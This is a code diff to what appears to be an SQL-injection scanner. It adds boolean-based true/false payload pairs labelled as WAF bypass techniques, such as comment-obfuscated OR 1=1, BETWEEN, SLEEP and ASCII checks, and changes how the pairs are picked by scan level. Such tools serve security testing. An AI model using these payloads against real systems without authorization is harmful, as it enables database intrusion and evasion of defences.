@@ -47,6 +47,14 @@ BOOLEAN_PAIRS_RISK2: List[Tuple[str, str]] = [
     ("1 OR 1=1",    "1 OR 1=2"),
 ]
 
+# Extended pairs returned at level >= 2 (more obscure WAF bypass techniques)
+BOOLEAN_PAIRS_LEVEL2: List[Tuple[str, str]] = [
+    ("'/**/OR/**/1=1-- -",           "'/**/OR/**/1=2-- -"),
+    ("' AND 1 BETWEEN 0 AND 2-- -",  "' AND 1 BETWEEN 2 AND 4-- -"),
+    ("' AND SLEEP(0)=0-- -",         "' AND SLEEP(1)=1-- -"),
+    ("' AND ASCII(1)=49-- -",        "' AND ASCII(1)=50-- -"),
+]
+
 
 def get_boolean_pairs(risk: int = 1, level: int = 1) -> List[Tuple[str, str]]:
     """Return boolean payload pairs for the given risk and scan level.
@@ -55,10 +63,8 @@ def get_boolean_pairs(risk: int = 1, level: int = 1) -> List[Tuple[str, str]]:
     level=2 extends coverage; level=3 returns all pairs.
     """
     pairs = BOOLEAN_PAIRS.copy()
+    if level >= 2:
+        pairs = pairs + BOOLEAN_PAIRS_LEVEL2
     if risk >= 2:
-        pairs += BOOLEAN_PAIRS_RISK2
-    if level == 1:
-        pairs = pairs[:11]   # AND/numeric/paren-escape contexts + OR variants
-    elif level == 2:
-        pairs = pairs[:16]
+        pairs = pairs + [p for p in BOOLEAN_PAIRS_RISK2 if p not in pairs]
     return pairs
